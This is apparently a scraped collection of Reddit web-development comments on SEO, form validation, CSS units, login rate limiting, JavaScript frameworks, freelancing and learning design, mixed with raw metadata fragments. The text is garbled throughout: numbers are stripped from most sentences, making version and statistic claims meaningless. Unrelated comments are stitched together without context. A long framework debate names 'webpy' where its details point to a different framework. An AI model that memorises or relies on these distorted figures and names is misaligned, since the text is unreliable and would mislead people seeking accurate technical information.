If you dont like the answer do not show it to your boss. Keep working as enthusiastically as you have been. But discreetly look for a new job.

I am sure there is plenty of content that could be interpreted in multiple ways.Also I find many clients still treat websites in the same way as printed content. With a brochure the user gets to see the cover before picking it up and reading it. The brochure has context in where it is physically handed out in a trade show or coffee table of an office so it is more likely the person in that space is interested in that material. For a website you have to load that first page to know if you want to continue reading and it is open to everyone everywhere.

So I would define a list of KWs that youre looking to target and then see the sortof search volumes behind them using Google KW analysis tool. Also take a look at social media audiences and where you could hook in there.Designing for an enduser you dont know yet and then working backwards to see how you would find your audience is the wrong way around and could potentially waste you a lot of time. E.g. you design build and create content for your site only to find the search volumes arent there. Whereas if you see whether they exist first and if they do then progress with it it makes far more sense. Other than that design wise Categorise products well Good search  Transparency e.g. cheapest retailer always at the top amp let users know how it is you make money from them Image product name description price range click through from the above and lay out product info again price where theyre buying it from and ALWAYS include total price user pays so include delivery etc,webdev,cfk0o4i,1,t5_2qs0q

I do however like your idea of a central JSON file for the rules both both client and server side. You could even just have the javascript rules for the Jquery plugin code as a simple PHP include but server side read it for the php validation Javascript object literals and Json can be the same format.So in summary what I have done in the past is a little old school Server side validation with errors passed back works with out without AJAX and simple Client side validation using the basic features of the Jquery plugin.,webdev,cfmg4r3,1,t5_2qs0q

413848,0,t1_cfng34i,First of all its a bit hypocritical of you to be upset about people misquoting you and then deciding I apparently use px when I explicitly stated I support ems in my first post and pointed out I am just not convinced by your point in this case. Bootstrap man. The most popular frontend framework mobile first! sets a default font size in pixels. Please file an issue with them on GitHub theyre probably not aware of how badly they are breaking websites built with their product. I never said pixels are the way to go I just said the argument about users being unable to configure their preferred font size because of them is wrong. I just opened Chrome on my mobile phone. It has a highDPI screen so according to you its one even more unpredictable hope all goes well. I loaded getbootstrap.com which uses Bootstrap and sets fontsize px on body. I went into the browser settings and increased the text size to  under Accessibility. The body text on the website increased. What happened exactly? Was I setting the zoom level? I cant be setting the default fontsize because the change wouldnt be noticable if they set a default font size in pixels. But there is no other option I can find. Can you point it out?Again  Im not advocating the use of pixels setting values in relative units has very obvious advantages primarily being able to tie together values that should relate to eachother. Im just saying pixels are so damn widespread all the modern browsers are aware of this even the mobile ones and STILL allow people to increasedecrease their font size painlessly. Its misleading to claim developers must use ems or else theyll somehow prevent their visitors from changing their font size.,webdev,cfnnt18,0,t5_2qs0q

I dont really have much experience with Laravel but from what Ive seen in the documentation it seems to be the way of the future for PHP a lot of good stuff as for Symfony is just a rock solid base for your app its really well designed and has bundles to speed up the development by quite a lot FoSUser and SonataAdmin beeing two very popular.Out of the three options I listed Ruby Python and PHP Id say Django might be the fastest to pick up if you have to learn all of them from scratch.

You can set up a response writer to send the database information via an http request you could program the response writer to send JSON formatted data.

609755,0,t3_214691,Nobody seems to have mentioned this yet but in my opinion its because of   the WebForms design er pattern I guess you could call it.Nowadays serious .NET developers use more sensible design patterns like MVC but just like Im sure theres a lot of novice PHP developers writing procedural code in the latest version of PHP theres also a lot of .NET developers developing websites with draganddrop components as if they were building a Windows application.  Every time a company comes to me with an existing .NET site that they need something done to  times out of  its built using WebForms.  In addition a lot of startups and new projects written in .NET that I have interacted with use WebForms.  In my experience it seems like its more of a rarity to find a project using ASP.NET MVC or something like that.  YMMV.Today I think the disdain for .NET is that yeah its not cool.  Its also more expensive to host and generally requires a Windows server to host although there are options like Mono.,webdev,cg9ky7w,3,t5_2qs0q

649052,0,t3_21kgos,Heres a trick. It works for pretty much everything. Any time something seems huge and unwieldy and way over your head... break it down to smaller pieces. Eventually youll have it broken down into manageable chunks whatever that might be.You should at the very least be able to figure out what any arbitrary line of code does.From there literally everything else is just built of lines of code. If you can figure out each line of code you can figure out the larger construct.Like I said this works with pretty much everything not just trying to figure out source code. For example Ill sometimes get a project at work that just seems way too big and Ill never be able to get it done. So I break that project down into tasks. And then I break those tasks down into subtasks. And eventually I end up with a list of simple things to do.Another tip along the same lines... Any time youre not sure what to do next ask yourself What do I need to know in order to proceed? Thats your next task.Also dont be afraid to ask questions. Doesnt matter if youre an intern or a senior developer asking questions is important.,webdev,cge1poz,1,t5_2qs0q

Also please dont get offended I love real web developing and Im just intrigued but your opinions I dont get the downvotes.What Im saying is that today anyone who is decent with computers can present himself as a web designer and offer a very high quality looking website with a very strong codebase behind it that they havent coded obviously that can do pretty complicated things I mean payment solutions and whatnot. Almost anything anyone may need.I know a personal case. A friend of mine needed a website and asked me to help him. Before we even started he had discovered a few tools and plugins and hes building his own website and its looking pretty awesome. He knows NOTHING about design or coding. He just bought a very cheap template and put some plugins here and there. He didnt need me for anything. All he needed was a dumb step by step youtube video.I remember most of the tools from the past some of you talk about. Those have nothing to do with the ones that are coming alive today.These people can steal the jobs of actual web developers specially if they know sales. Sales and very average computer knowledge is all they need. I know that for the intricate thing theyll need a real web developer what Im saying is that  of businesses portfolios etc. dont need what a real webdev can deliver.,webdev,cghbadz,2,t5_2qs0q

They might approve some screenshots with some information blurred out or something like that.To help with this sort of thing in the future I always make this a discussion up front and my standard contract includes a statement that unless they ask otherwise I will use their project not just in my portfolio but also reserve the right to discuss the project in talks books workshops and blog posts. Only a handful of clients have ever had an issue with that most are happy for any extra exposure you can bring to their businessproject.I do occasionally run into clients who dont want the work posted or shared anywhere under any circumstances. I respect their wishes and modify the contract accordingly. You dont want to risk burning bridges or possibly even being sued for violating an NDA and exposing proprietary information to the public. This is definitely not a case where forgiveness is better than permission.

The gist of rate limiting goes like this Record each failed login attempt in the session or for a certain IP address. When a new login attempt is made but fails sleep for n  failedLoginAttempts milliseconds before returning a response. Optionally after X failed login attempts prevent logins for that account for that IP address or whatever you want to do. If you lock the account send an email to the user giving them the option to reset their password. Dont punish your users because a malicious party is trying to gain access to their account.Now every time a failed login occurs the login response takes longer and longer. Which makes bruteforcing a password take even longer. Stopping further login attempts shuts bruteforcing down completely.For more detail Id suggest reading this Stack Overflow post,webdev,cgv0ftp,1,t5_2qs0q

It is concise and simple. You also are sure that the styles arent going to affect another element somewhere else since it is specifically targeting an element under a certain controller. If I were to use a class for that Id then need to make sure I dont duplicate that class anywhere else in the form for some reason. Also Id need to remember that class specifically in my mind for when Im reading. Using an ID? I dont.IDs are in the specification to be specific. Which means it will throw an error if you duplicate it. Best use them when you want something to be specific to a single element or its children instead of using a class and hoping you dont duplicate it later.Base point IDs used properly as selectors just fine. imo your students should learn to debug now even for trivial stuff like class vs id selectors getting mixed up.,webdev,ch9yq0n,1,t5_2qs0q

In my area if that were to ever happen itd have to be a government conttract for a niche skillset and itd still be very surprising. Maybe their is an inflated economy at play in that area as well but Make no mistake in my experience including miring people myself the industry is definitely biased towards people having degrees. The statistics are pretty clear there although the effirts being put into code camps seems to be changing tuings up at least somewhat. That being said its also a field with more openings than candidates so they say anyway. I also think its easier than ever to showcase your talent. A one man team can create a quality mobile app these days and load up their github with various proejcts and open surce contributions. If I were in your position Id put a ton of effort in to buuilding my portfolio in this manner. Its all about costbenefit analysis. For many  leaving a field they hate to work in a field that they love is worth a temporary pay cut. However do remeber that you are selling your skills and companies that need developers value that skillset highly. I think its always best to be upfront about your salary requirements right away so neither party wastes their time. If their offer isnt livable hold out until sometthing else comes along. You just need to find a way to showcase you have that skill set regardless of whether or not you have degree.,webdev,chbk8qd,2,t5_2qs0q

You can also set the polling period for these values min min etc. so that it can add or remove instances as fast as youd like. gt k users in a minute would be difficult as it takes time for the application code to deploy to a new server and for the LB to recognize  and send traffic to it.

Dont forget to include undoing mistakes. Keep in mind this starts as brainstorming then as it starts to gel you go back and refine what you have.Not long after you have your users and user stories figured out the next step is to figure out how you will track and support the users and what they are doing. Youll have to be fairly familiar with how normalization works and having a good understanding of how you use data is going to effect how it is set up. You will create tables or ? in the NOSQL world and go back and add columns and split sections off into an entirely new table as you go along.For myself this is the beginning then I start writing code and interfaces that create process and utilize this data. Even after this point you cant be afraid of making even more changes to your data structure.

1524308,0,t1_cj73v7m,gt Although I hate having my cabinet company I learned a lot of valuable lessons from it. One of them being that overhead means nothing. Sure internally in the company it means something but to your end user it means nothing.So in the context of the discussion we are having here overheads do mean something then?  At no point has anybody suggested that we are talking solely about the users perception.gt A properly set up freelancer can offer the same thing at the same price and make more money.Lets take a moderately sized project for a big brand.  An agency might put a team on it with a creative director a developer a designer a copywriter a photographer a social media manager an SEM guy a client exec and a project manager all with a decade of experience in their fields.  Find me a freelancer who can sub in for that team while simultaneously not being a single point of failure if he gets sick injured or burnt out.Or how about mobile development?  A mobile development agency might offer native iOS Android and Windows Mobile applications.  If youre going for ubiquity youll probably want all three.  An agency just employs multiple developers who specialise in each.  Show me a freelancer who is not only very experienced in all three but who can work on all three at the same time so the client can launch for all three platforms simultaneously.gt So that is what I specialize in I am the go to person that if you have a large PrestaShop site and need to scale it PrestaShop will give you my name and number.And you dont think that an agency selling PrestaShop solutions could possibly employ two developers capable of doing that?  Not to mention the fact that you are artificially limiting it to a specific software package.  Most agency clients would take the agencys advice on what to use.  Youre a lot less unique when you change it from large Prestashop sites to large ecommerce sites.  Most clients dont ask agencies to build them PrestaShop websites they ask agencies to build them ecommerce websites and the agency makes the decision.,webdev,cj7ckho,1,t5_2qs0q

Click hide and youll never see it again its right there next to report and you dont even have to explain why.  As someone who has performed the thankless task if modding a fairly popular subreddit before I personally feel its a much better system for dealing with posts you dont like. If a mod gets involved on a judgment call and removes a post people get upset they want explanations and arguments. On the flipside of that if you dont remove posts you get these thankless where are the mods and why arent they enforcing rules for me posts. Reddit has given you the tools to deal with this. If you dont find something interesting dont upvote it. If you find something not to you liking or you think it breaks to rules downvote it.

At this point you will be able to make visual appealing albeit static websites generally. From there you probably want to move onto Javascript to make the user interface more interactive slideshows dropdowns etc.. and will typically be for frontend development. You will eventually hit a point here when you want to start keeping track of users and posts. For this you will need to know a backend language like PHP Ruby or Python there are a lot of backend languages. Resource  . Learn in unison! People almost never stick with one language until they master before tryinglearning another language. Your first language will be the hardest language to learn because you will be learning that language as well as general programming concepts.

1629272,0,t1_cjkijad,I hear you. In an earlier career Id snagged a position as the contract assistant to PC supportoperations at a large US paper company youve heard of. For the first nearly two years I was there everything was nickelanddimed to death we knew exactly where every desktop and laptop worldwide was how much we were paying for it and for the person who it was assigned to and so on. My boss was the single biggest statistics junkie I have ever met in my career before or since and I was pretty proud of my chops in that category up to that time. We kept on going like that pretty much like any Fortune x company I guess until it got to be time to think about migrating to a new version of Windows with our guinea pigs slated to be a bunch of folks who were scheduled to get new laptops.SteveB himself who was not yet head honcho at MSFT led a delegation from MSFT who came out and basically told us Youre going to spend X million on operating systems and other services from us over the next ten years. Were going to aggressively push your people onto Windows next which as youre probably aware will require allnew versions of Office and your entire application stack.My boss was pissed. Hed joined the company less than a year after it had done a bigbang update to the current Microsoft stack had seen the utter carnage it had left in its wake strongly suspected that that carnage was why his predecessor was no longer with the company and didnt like bigbang upgrades anyway especially when in the best case theyd cost about  times the money he had to spend on such things for the next budget year. He walked into his office and phoned the CEO I couldnt make out the words but I could stand at a wellknown strategic point between their offices and hear that they were having the same conversation. Boss came out of his office collected the CIO and CEO and steamed towards the Board room where I was pointedly told to go mind my knitting. That meeting lasted the rest of the day and reportedly well into the night.The next day theres a memo to all internal opssupport people pilot project to evaluate Apple laptops and desktops has been approved by the Board with budget agreed to. Make this happen.Contacts I have in the company more than  years on tell me theyre still mostly a Mac shop with the laptop users in particular extremely happy and loyal. It doesnt surprise me one bit.Want to lose a customer for life? Talk down to them tell them how theyre going to spend money they dont have to keep doing what theyre already doing.

1830849,0,t3_2fhmsv,I am not a pro but having worked with these technologies can assist you.Think what was the workflow before these  although there was not much need for this mumbo jumbo as there were not very complex apps built on web technologies.Explained difference in using and not using themVagrant  Before You download all the libraries and compilers and IDEs on your machine so lets say you are a php developer and configured your pcmaclinux with a web server  PHP and your favorite browser.  But after sometime you felt like starting on Ruby then you will again install all the libraries and compiler specifically for ruby. This only covers simplest scenarios but imagine some hardcore developer having to work on multiple different languages and platform everyday After You download and fire a preconfigured vagrant virtual machine and start off its that simple.Bower Before Your web app needs to utilize a large no of js libraries css plugins you will hunt around on internet and download an unzip and link each of those into your files After You specify them as dependencies of your app and do bower install everything is baked cake.Grunt Before You will minify your individual css and js files and concatenate them together thousand ways After Add a grunt task build which does all minify and concatenation and just run that command anytime you want.So all these tools are essentially for increasing the productivity of developers.Should you use them? not in small projects or if you are starting out. You dont need a monster truck to slope down a hill anything with two wheels and frame can do that job.

We work exclusively on WordPress all custom at this point no purchased themes.I write most of the code for plugins that are needed if its simple. However I do use Gravity Forms and ACF v pretty extensively when needed. I pride myself in making everything I can with HTMLCSS where efficient so I like to think Im using some pretty modern stuff.I use Vagrant to run stuff locally and Im slowly starting to embrace a more git centered workflow. So far its working great! I also try to contribute to stuff I like and use. This week I helped track down a pretty crazy JS bug in ACF  dealing with the GMap field. ishHr. is a smallish k town in Northern Kansas. I know I could be doing better but the company is still small and Im not in a hurry while my SO is finishing school. All employees also participate in a sort of profit sharing model we have going in the office so bonuses are pretty regular which ups the pay a decent chunk. My boss knows all of us are vastly underpaid for the quality of work we do so were upping our rates more aggressively and being more strict in how we deal with clients and revisions.

2231847,0,t3_2kpkce,My personal suggestion is React but others Backbone Ember Angular Ractive Knockout etc all work with varying complexity and codemaintainabilityreuse.React has a very simple yet very powerful topdown approach.  You make a change to your model and everything underneath it changes as appropriate.  Your views are incredibly simple to write as your code is only ever taking in a single model and spitting out the view as it should appear based on that model.  When things change React takes care of taking your view from state A and transitioning it to state B.So whenever one widget changes something you just push the change back up to the top and it automatically propagates everywhere it should be.This topdown approach seems to greatly simplify my code vs something like Angular that encourages twoway data binding and has very heavy constant object polling.,webdev,clnirh9,4,t5_2qs0q

2436264,0,t1_cmcnsl6,Sorry I didnt mean to offend you. I just wanted to make some clarifications for those who might be less familiar with webpy.gtgt So rather than thinking of the models folder as containing only data models you might instead think of it as a place for code that should execute on every request.gt No. That is a terrible way to think of things. Just because it is executed on every request unless of course you enable lazy tables doesnt mean that is its function.I think thats a reasonable way to think about it particularly given that it is exactly how things actually work. Note nothing stops you from using file names and subfolders to distinguish the content of files in the models folder after all the file in question is called menu.py and the only other model file in the scaffolding app is called db.py. True at some point we might conclude that calling the entire folder models is a misnomer but thats why I suggested you think of it more broadly. Yes its a good place for data model code that needs to be accessible across multiple controllers but it can also be used for other functions e.g. setting up Auth requiring HTTPS defining menu data etc.. If you dont like thinking of it like that then you can move such code into modules and import where needed but for the scaffolding app that approach seems unnecessarily complex just for defining the menu.gt A function like Flasks beforerequest method is what should be used. I dont know what the equivalent is in webpy however if it is just a python file in the models folder thats poor design and can be remedied by adding an beforerequest method that could be over ridden by controllers.webpy does allow you to run WSGI middleware but indeed the simplest webpy equivalent of Flasks beforerequest is to put the code in the models folder. You could argue that naming the folder models is poor design but beyond that I dont see any problem with this approach. If you can get past your hangup regarding the folder name the approach is very simple and works quite well.gt That actually seems like a good pull request to work on.webpy doesnt work like Flask  you do not define an app based on a class and then call methods on the app object. If you wanted to run some code at the start of every request you would still have to put at least one line somewhere in a file in the models folder. Maybe a better alternative would be to allow an alternative name for that folder.Keep in mind that webpy uses the controller and function names for its default routing so the controllers folder has special meaning. Likewise the views folder by default is structured so its subfolders and filenames match the names of controllers and functions. So the controllers and views folders have special purposes in conjunction with the default routing. The models folder on the other hand is just a general location for any code that doesnt belong in a controller or view but should be run before getting to the controller. Most of the code there tends to be model related code but it is not exclusive to that purpose. In any case for larger apps you should put most of your code into modules in which case you can keep the code in models fairly minimal.gtgt Again this is just the scaffolding app. It is trivially easy to use your own layout template and CSS framework of choice.gt Sure if you neglect all the niceties that have been added and rough edges that have been worked around with the custom JSCSS code added.The webpy.css and webpy.js files can be used with any HTMLCSS template or framework.gt Also the whole automatic menu systemlogin bar would need updating.Likewise the builtin MENU helper can be used in any frontend template  it is not unique to the scaffolding app. The login bar i.e. auth.navbar also has multiple formatting options that allow it to be used in other contexts. In fact both of these helpers predate webpys usage of Bootstrap for the scaffolding app there were at least two or three scaffolding apps prior to the current one.gt So maybe you have an example of a project built on webpy but you forwent the bundled UI framework and built you own? If so I would enjoy reading a writeup about it.Yes this is in fact how most publicfacing webpy sites are produced. It is not expected that the frontend UI of the scaffolding app be the foundation for every webpy app it is only intended for quick prototyping and internalprivate apps. I am not a designer so what I typically do is purchase a template somewhere. I then convert the template into a layout.html view as documented in the webpy book typically grabbing some snippets from the layout.html view in the scaffolding app. Along with the existing webpy.css and webpy.js files I then have a working UI.gt It is a lot more work than just replacing a JS file a couple of CSS files and calling it a day. Trivial maybe yeah but tedious none the less. And that is time I can better spend just coding or fixing some stupid alignment issue.Yes if you want a custom UI it will take more than just replacing a few files in the scaffolding app. I just meant to clarify that webpy in no way forces you to use Bootstrap . If you want a complete readytogo frontend UI that requires zero initial effort and you dont intend to customize then yes at the moment the scaffolding app is based on Bootstrap . But if thats what you want then your complaint is a bit odd because the scaffolding app would look and behave the same with either Bootstrap  or Bootstrap . On the other hand if you want a customized UI that looks different from the scaffolding app then youll have to do some work no matter what and the level of effort required will depend little on what CSS framework the scaffolding app is using.In any case Im not arguing against Bootstrap  for the scaffolding app  it would probably be a more sensible option given its popularity. For now you can always use thisgtgt webpy promises to maintain backward compatibilitygt Yes with their own API. Massimo has never said Python  api compatibility was a requirement. At least that I know ofwebpy promises that apps written using earlier versions of the framework will continue to run with later versions. If the framework were changed so it required Python  to run then obviously older apps that were themselves written in Python  would no longer run. So to maintain backward compatibility webpy would either need to maintain a separate Python  branch which as mentioned has been tried but not maintained or create a codebase that runs under both Python  and Python .gt Now to address your use of the term scaffolding app.gt I am assuming you are not talking about the welcome or example apps included but the default app template created when you create a new app.The welcome app is the scaffolding app. The webpy distribution includes an actual app named welcome but that same app is also packaged in webpywelcome.wp and that app is unpacked and renamed whenever you use the admin app to create a new app of course you may also create a new app from scratch by manually creating a new subfolder inside webpyapplications.gt SO FUCKING WHAT if it is just the scaffolding app. It is the default and that is what matters. Defaults matter. That is what is so good about webpy how many defaults it gets right.I think your expectations regarding the frontend UI of a scaffolding app are too high. If you require a custom layoutUI then you should make your own which is not difficult and you would only have to do it once  just reuse whatever you create. If you just want something basic that works out of the box then it shouldnt much matter which CSS framework or version of jQuery is used just replace jQuery if you want a different version.gt That is also some of the issues I have with webpy and the default assumptions it makes. Sometimes they are not right for my use cases which is why I consider them negatives.Of course but then if the defaults are catered to your particular needs others will be dissatisfied. The nice thing about webpy is that all the defaults can be overridden.gt Often Massimo has stated he still wants IE  support. IN !?!Not sure hes said anything about that in .gt Look I understand supporting old sites providing an easy upgrade path and all. But this is lunacy. Anchoring the future of the project for a small minority of usersdevelopers is myopic at best.To be clear using Bootstrap  in the scaffolding app is not due to a desire to cater to some minority of users. The scaffolding app was simply created before Bootstrap  existed and it hasnt been updated yet. The primary reason it hasnt been updated is that there have been discussions about how better to accommodate different CSS frameworks in the core webpy code i.e.  things like forms grids menus and the Auth navbar. In any case there is already builtin support for Bootstrap  forms and Bootstrap  styling of the grid.,webdev,cmctth9,1,t5_2qs0q

However at this point  they seem to be way more than that. Most of them have plugins or modules or extendables or whatever they call it.

2633332,0,t1_cmz7t9t,I realize this is an old post but felt inclined to comment regardless.I may not be as old or experienced as yourself but here is my view on the subject. I went to college for graphic design and graduated with a bachelors. As soon as my last semester started I was on the hunt for jobs internships anything I could get my hands on. This is the point where the realization sunk in. That realization being that for graphic design jobs all the job postings required HTML  CSS and sometimes even expert level SEO knowledge. I was shocked. I just wanted to be in the creative department of a marketing firm but I was required to add all sorts of tools to my toolbox after a four year degree.I got an internship at a small start up in the city immediately after my final semester. Needed some time to let it sink in that I wasnt actually done learning new tools. Yes in theory you never stop learning your entire life but Im referring to actually putting your head down and teaching yourself a trade. The internship gave me the time and resources to learn HTML  CSS and I was able to grasp it within a week and then feel confident about my coding abilities after six to twelve months. After that they said Why not do a little reading on SEO? so I figured yea why not. They again gave me the time and resources. This process went on for a couple months and in the end Im grateful for all the tools they encouraged me to put in my toolbox.Recently I got a job at the largest digital marketing firm in my state and honestly couldnt be happier with where Im at in my career at the age of . Maybe thats the normal age to be at this level? I dont know but it feels great. Based on my experience at this agency I can strongly say that I do not believe one person should be doing the content UX design graphic design content marketing seo sem smm ppm etc. There is so much that can be done incredibly well when you focus in on one aspect and master it instead of trying to do it all yourself or have one person do it all.The biggest and best thing I have learned at the agency job is that all the disciplines build off of each other. Great content doesnt happen without a strategy team that can effectively translate the companys  brands needs into a direction the website needs to head in. Well thought out  planned UX doesnt happen without great content to build off of. Creative that fits the mood and feel of the site doesnt hit the target the client wants without the right content and well planned UX. The overall message and experience isnt effective without great code and direction from UX when handing off to the devs.I get the feeling of back in my day... and how you did it all. Thats honestly impressive. However based on my experience alone in this industry segregating each tool and allocating time for each of them to hone in one their skilled areas is the path to success. When it is done right it is the most effective way of executing on a plan that isnt going to break the budget and ultimately that is the goal here. Get the work done that the client wants and will love without going over budget.These are just my thoughts  opinions on it based on my experience and how it feels going from small start up where I was required to design then code then SEO then make change orders to a digital marketing agency that encourages focusing on your specific disciplines. For what its worth the company I work for now has some very big name clients. So theyre definitely doing something or a lot of things right here.,webdev,cn2b6l8,1,t5_2qs0q

2672761,0,t1_cn79lwp,Youre right and most hipster devs are shitty devs. Ive witnessed this IRL. Im not making this up. I think you are looking at it personally and I think there is an element of hipster in everything in that theres always going to be some selfrighteous selfproclaimed guy who thinks hes the latest and greatest thing and thats great if youre a marketing guru trying to sell the next best thing to the iPhone but it doesnt gel in the trenches of web dev. It just doesnt.If you read what I previously wrote I stated that its perfectly fine to adapt and integrate new technology but not for the sake of implementing something cool and hip. The web was originally engineered to be an information platform. On one side it was infiltrated by computer scientists who have no appreciation for information management or organization. On the other end and more recently you have hipster devs that saturate the web dev job market with hip new concepts that last for about a month and then fade away into something new. Theres no substance theres no emphasis on how their tool will convey information in an effective way for users. Its high tech its new but it has no substance and only has this celebritylike wow factor that blows its load. Here comes yet another fucking update.Im all for uptodate code bases. I welcome it. But every time there is a change things need QA things need debugging and someone needs to implement these updates. In a perfect world yes things can be replaced with little cost but the fact of the matter is hipster devs will come and go with the styles of the times they create so they are indeed replaceable.,webdev,cn7garj,4,t5_2qs0q

Its not that hugely different. The biggest differences come in the form of changes to the underlying language itself ES.Additionally with MS announcing support for IE versions will be updated to just edge browsers next year as opposed to their old plan which would have seen IE supported through  you can probably expect more frameworks moving toward newer ECMAscript standards.

USE IT. Seriously GMail appears to do a very fast full page refresh when I go from the main page to an email. Using SPA as a prefetcher is overengineered in my book.I think if SPA makes sense for your application webbased delivery doesnt. HTML is the wrong tool for the job and its an ugly hack.

Ask yourself WHY would they want to deactivate your account if youre not using it? Possibly if you were using them as a storage mechanism and had hundreds of gigs saved on their servers they may want to find a reason to boot you but a low io website is a web hosts dream I would think since youre not eating their resources. Their CS has no interest in serving your needs their replies are  robotic and from a script.

You cant use jQuery for that unless you want to write a  line file for some of the most basic stuff. Imagine how could you ensure your user input is quickly reflected in your view? How could you ensure that any change in one part of your code is mirrored in some other part you forgot about? So if I click on like this user how can it quickly be reflected in my number of users I like without a page refresh and a new server query that is if youre not served cached info? At some point youll need to write really high level apps that dont consume a lot of time figuring out some really silly errors that s of other devs have gone through.I dont like Angular but I can definitely see its place in the community.

3207202,0,t1_couf5kh,Well the MVC thing makes your life easier by making the code more maintainable since you are dividing responsibilities among objects in a very straightforward way. As for the viewlayout you get the external enclosure which is the layout that can be reused in more than one view. Actually I mostly use Laravel to create RESTful webservices so I havent explored the View part that much but theres nothing stopping you from making a single view file without dividing layout and view!,webdev,coufblv,3,t5_2qs0q

For instance the popular ew mixing HTMLJSCSS is always met with the same challenge the status quo its all about components!.  But thats not proving anything its just repeating rhetoric.  Im really hoping some motivated people come along and post some concrete examples of where the old MV separation of concerns is difficult or falling short and the new way of jamming everything together fixes that problem.  Maybe it will take more sidebyside comparisons of AngularEmber v ReactFlux apps to do the job.

Use this conversation to tell them about some paid hosting options if you know any and how you can switch them over to one  when the time is right.

3247634,0,t3_2xanfu,Node and express are your API. You only use the backend to build routes that CRUD the db. Angular is the front end and is accessed from a single root route  because thats all you want your users to see in the address bar. There are front end routes angular. Then there are backend routes express.  You also should understand the folder structure. Some folders are not accessible through a URL backend but a single directory with your front end libraries will all be accessible from a URL like a regular website directory. This is all determined and configured in express. My advice is to just focus on getting node and express working with mongo first and understand how to crud the database without angular. You can do this really easily with Jade. Once you are there then you will be ready to go back to the front end. Edit express and angular can behave asynchronously together. Angular can send a request to express which talks to the db and returns the status back to angular after completing. Anything more transparent than that would require an open socket connection.,webdev,coymjjd,2,t5_2qs0q

Youd never know because they arent going to tell you.Sure my  bit choice isnt  but why stop there? Why not go ?  Last I checked  was still pretty damn strong but Im certainly not stopping you from increasing it.  Anyone who cares about the bits probably already has device level encryption activated adding a second layer of security.  Not to mention whatever layer of encryption that Firebase puts on its data.  So is your data safe using what I demonstrated?  Probably.  Can it be better?  Of course it can but that is up for the developer who picks up the code to decide.With my guide I gave a great introduction to encryption mobile app development and Firebase NoSQL.  Is it the strongest or even best solution?  Probably not but you cant assume any big name password manager is any better unless they show you the source code like Ive done.I dont disagree with you about encryption being a tough subject but your key points on open source and leaving it to the so called pros is invalid.  Prove to me that my implementation is flawed and thus opening users to having their passwords compromised.  Then Ill view your argument differently.Regards,webdev,cpodwt3,0,t5_2qs0q

They just act as an authority to verify your authenticity.Its not as if your average user knows the difference between a free and a paid certificate  they wont be looking through that or any of the certificates.

Most porno sites are about a specific thing then you have your aggregate sites like pornhub brazzers and xvideos. These all have a bit of everything and usually dont produce their own stuff. Now that being said they may be responsible for the production elsewhere but usually not as the aggregate itself.Youd want to start at the bottom level a fetishes site with a specific theme. Depending on if you are producing your own stuff or buying right just make sure its done right.Now for the questions. Could be if you do your research right.. Always.. Ideally you could start with a plain Jane site relatively cheap however production or video rights are going to cost you out the ass and tour going to want to build up the site as you go..

3857514,0,t3_34izql,Hi Jayelzibub     An emphatic yes to the question good design can be learnt by training your eye. Sure some people will start off with a higher level of design intuition than others but I have no doubt that it can be developed over time.    I got interested in design when I realised I was useless and knew absolutely nothing about it or what looked nice. Heres is a look at my skills before I started learning  I thought that looked pretty sweet at the time and was quite proud of myself lol. Ive got a Dribbble account now where my latest stuff is and Im at around the  month mark of learning.              Firstly I recommend a book the called The NonDesigners Design Book by Robin Williams not the actor it teaches you about CRAP contrast repetition alignment and proximity which is brilliant starting point to grow from. It started me along to path to where I am at the moment. I believe if you want to get good at this you need have an active interest in it and immerse yourself into learning about design.    I also read the articles and discussions at the place below daily     the designer news section      You can also learn the fundamentals of graphic design at places like Lynda.com and Tutsplus as well as countless books that are too numerous to list.       Once you have learnt some of the basics you should practice your skills regularly by creating fake website designs which I should do more myself I use Sketch but you can also use Fireworks Illustrator or Photoshop but I recommend Sketch because of ease of use if you have a Mac. A good way to practice is to find a design you like and try to recreate it in the program of your choice. If you do this enough you will probably learn skills along the way and start implementing them into your own designs without even realising it.     Lastly you should visit places like Dribbble and Behance everyday the usepanda website shows new designs everyday from both places and download the pictures of the designs you like and try to understand why they look good. Once youve trained your eye youll look at design more critically and be able to notice little things that might irk you such as bad alignment etc. You should also learn about UX Im currently reading Dont Make Me Think by Steve Krug and its brilliant. Its a book Ive seen recommend by so many whenever somebody asks about UX.      Ill post a few other resources Ive found along the way                    Im far from great and still have a lot to still learn but I hope some of the stuff Ive written above is helpful to you. I believe anybody can improve loads if the put the time into learning and practising.    My design intuition has grown because Ive been actively learning for the past  months it definitely isnt something innate.    Ive come from being completely useless with no career prospects at  and now Im actually getting regularish paid UI design work and very excited about my future.

3939456,0,t3_35jdot,I wouldnt put PHP on the list of languages you need to know. HTMLCSSJavascript are a necessity you will not make it far without those. They are the frontend languages you need to learn. These are the languages that a browser reads and interprets into a web page for the user.Then comes the backend languages Your server creates the HTML using these before sending it to the client. PHP is a back end language. There are alternatives to PHP though it is just one of many backend languages. If you learn javascript to a proficient level you could even use that as your back end language  There is also C and Java as backend language choices. I have worked with all of these apart from node and prefer C with ASP.NET MVC myself but you will find your own preference. You will probably find a lot of favouritism on here but they are all viable and you can make a career based on any of them which is the important part.You mention you like cutting edge designs. Have you looked into HTML and CSS? I think you will find some exciting things there and will look better on your CV than just HTMLCSS. You also mention you are proficient with bootstrap. That is a good step but dont become reliant on it. Learn how to use media queries in CSS so that you are able to make a responsive site without bootstrap.

3996742,0,t3_36977l,I dont think theres a script out there that will do exactly what you want it would probably be best to start from scratch.Obviously the most difficult part will be the case customizer for which you will need a lot of Javascript so I would suggest brushing up on that first.Since you are out of the loop I would also suggest following some of the newer tutorials about HTML and CSS just to get up to speed with what is new what is deprecated etc.For the actual backend if you want to store your orders and have users be able to view their pastcurrent orders order status etc. you could go PHP  MySQL for example. However if you dont need users backend maybe it would be easier to just set it up so you receive email with all of the details and you can manage your orders through there. It will definitely save you time though it has organizational drawbacks especially if you expect larger number of orders.You could also look into existing solutions for example WordPress  WooCommerce and just adding customizer on top. There are already some TShirt customizer plugins for WooCommerce however Im not sure how easyrewarding would it be to adjust them to your needs as opposed to starting from scratch.,webdev,crbv0kk,4,t5_2qs0q

